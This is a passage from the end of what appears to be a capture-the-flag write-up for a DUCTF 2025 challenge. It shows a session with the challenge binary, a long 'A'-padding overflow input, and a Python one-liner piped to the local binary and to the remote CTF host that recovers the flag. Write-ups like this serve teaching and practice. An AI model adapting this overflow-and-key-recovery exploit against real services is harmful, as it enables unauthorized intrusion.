    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Incorrect!
    1> Print public key
    2> Start over
    3> Submit answer
    4> Exit
    >
    1
    Public Key: 79dbb66710060b6ae4e71f7aa53cab76324a3c6f67acd4c58d069d8f0a79d0a3813dfa1d60d1b8a2f6aa363e10b33cc5023d6af5c6fb7a2a1c640f7e2c0aeae7d1b3204b0dbd9df51f48c374592e27563dc57bfbd0a441153fc629dad6d97a83a858fdedfd9ad6a2ee072a0c7b284ebb7845740a77f5105493a49913a65f20b3c813d368e06ef8b8
    1> Print public key
    2> Start over
    3> Submit answer
    4> Exit
    >
    3
    Enter your guess (hex):
    44cd735b7b1c5dca3d63138eb0ec40dc09708cb3ae96d0b6e100010ff6935dc840d21f5744e78e203f0078e384c6d47bb974f8866ec5a70218a1393b9abcc767d7e064838712f8138133559b18a5a7f0dc899748b4ebdf75d873b18c0d47fe553c271cd13ba79cee4b6b09f501d0dc7e0b9c1e44fa8a84c87d0a61f0e49c5de5a83da2731c23d75b
    DUCTF{test_flag}
```

`

We can wrap everything in a one-liner:

`

```
    $ p=0xC2F2E0F7EC137C1F4F67D5B4276756FCDA5D5DAADDE9993AD2289D7CA855F50BCEC64FE5859C503A654F32422C5C02B5083BC83DB66EECBD347B971C0ACEF5A387C5E90FCFD25F87F565752574CC4D72E1AFE0E09A1FBFDE1F1960A56226523BD67B0E7FDE83FE53F85AC61D94AB52D837CCC1120F22D58CA79334E23B66AD23B1CB493F5DC8E2B7
    
    $ python3 -c "q = ($p - 1) // 2; print(2); print(3); print('A' * 2_184); print(1); print(3); print(hex(int('0a' * 0x111 * 8, 16) % q)[2:]); print(4)" | ./chall | grep DUCTF
    DUCTF{test_flag}
```

`

## Flag

With this, we can get the flag on the remote instance:

`

```
    $ python3 -c "q = ($p - 1) // 2; print(2); print(3); print('A' * 2_184); print(1); print(3); print(hex(int('0a' * 0x111 * 8, 16) % q)[2:]); print(4)" | nc chal.2025.ductf.net 30006 | grep DUCTF
    DUCTF{fr4gm3nt3d_d1scr3t3_fr4gm3nt5_l0g5_m4ss_h34p_m4554g1ng_gr00m1ng}
```

`
